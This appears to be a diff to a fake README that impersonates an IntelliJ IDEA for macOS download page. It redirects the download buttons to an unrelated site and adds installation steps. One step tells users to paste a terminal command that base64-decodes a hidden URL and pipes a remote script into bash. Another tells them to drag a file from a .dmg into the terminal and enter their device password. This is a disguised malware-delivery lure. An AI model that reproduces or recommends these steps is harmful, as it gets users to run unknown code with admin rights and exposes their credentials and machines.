@@ -7,9 +7,35 @@ Whether you're coding in Java, Kotlin, Python, or JavaScript, IntelliJ IDEA offe
 ---
 
 ## ✅ Download IntelliJ IDEA for macOS  
-[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](https://jetbrains-intellij-idea-download-mac.github.io/.github)
+[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](https://shuziktobehuman.github.io/huja/JetBrains)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
+
+
 
 ## 📦 What is IntelliJ IDEA?
 
@@ -45,19 +71,10 @@ Built to understand your code, IntelliJ IDEA automatically completes, analyzes, 
 
 ---
 
-[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](https://jetbrains-intellij-idea-download-mac.github.io/.github)
+[![Download IntelliJ IDEA](https://img.shields.io/badge/Download-IntelliJ_IDEA-blueviolet)](https://shuziktobehuman.github.io/huja/JetBrains)
 
 ---
 
-## 📥 How to Use
-
-- ✅ Download and install IntelliJ IDEA for macOS  
-- 📁 Open or create a new Java/Flutter/Spring project  
-- 🧠 Use intelligent code suggestions and refactoring tools  
-- 🔧 Configure plugins, toolchains, and Git integration  
-- 🚀 Run, debug, and deploy directly from the IDE  
-
----
 
 ## 🖼 Preview
 
